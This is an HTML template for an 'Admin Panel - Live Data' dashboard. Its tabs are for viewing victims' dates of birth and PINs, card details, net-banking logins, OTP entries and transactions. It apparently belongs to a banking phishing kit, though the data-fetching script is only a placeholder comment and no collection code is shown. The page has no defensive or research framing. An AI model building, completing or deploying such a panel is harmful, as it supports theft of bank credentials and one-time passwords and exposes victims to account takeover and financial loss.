<!DOCTYPE html>
<html lang="en">
<head>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Admin Panel - Live Data</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #f4f4f4;
      margin: 0;
      padding: 0;
    }
    h2 {
      text-align: center;
      color: #00169e;
      margin-top: 20px;
    }
    .nav-buttons {
      display: flex;
      flex-wrap: wrap;
      justify-content: center;
      gap: 10px;
      margin: 20px;
    }
    .nav-buttons button {
      background-color: #00169e;
      color: white;
      border: none;
      padding: 10px 16px;
      border-radius: 10px;
      font-weight: bold;
      cursor: pointer;
    }
    .section {
      display: none;
      margin: 0 16px 30px;
      padding: 20px;
      background: white;
      border-radius: 10px;
      box-shadow: 0px 0px 8px rgba(0,0,0,0.1);
    }
    .section.active {
      display: block;
    }
    .entry {
      background: #f9f9f9;
      border: 1px solid #ddd;
      padding: 10px 15px;
      border-radius: 10px;
      margin-bottom: 15px;
    }
    .delete-btn {
      background-color: red;
      color: white;
      border: none;
      padding: 4px 10px;
      border-radius: 6px;
      float: right;
      font-weight: bold;
      cursor: pointer;
    }
    @media screen and (min-width: 768px) {
      .section {
        max-width: 600px;
        margin: 0 auto 30px;
      }
    }
  </style>
</head>
<body>

<h2>Admin Panel - Live Data</h2>

<div class="nav-buttons">
  <button onclick="showSection('user')">User</button>
  <button onclick="showSection('dob')">DOB + PIN</button>
  <button onclick="showSection('txn')">Txn</button>
  <button onclick="showSection('card')">Card</button>
  <button onclick="showSection('netbanking')">NetBanking</button>
  <button onclick="showSection('otp')">OTP</button>
  <button onclick="showSection('all')">All</button>
</div>

<div id="user" class="section active">
  <h3>1. User Details</h3>
  <!-- User entries will appear here -->
</div>

<div id="dob" class="section">
  <h3>2. DOB + PIN</h3>
</div>

<div id="txn" class="section">
  <h3>3. Transaction Details</h3>
</div>

<div id="card" class="section">
  <h3>4. Card Details</h3>
</div>

<div id="netbanking" class="section">
  <h3>5. NetBanking Logins</h3>
</div>

<div id="otp" class="section">
  <h3>6. OTP Entries</h3>
</div>

<div id="all" class="section">
  <h3>7. All Submissions</h3>
</div>

<script>
  function showSection(id) {
    document.querySelectorAll('.section').forEach(sec => {
      sec.classList.remove('active');
    });
    document.getElementById(id).classList.add('active');
  }

  // Firebase data fetching script here
</script>

</body>
</html>
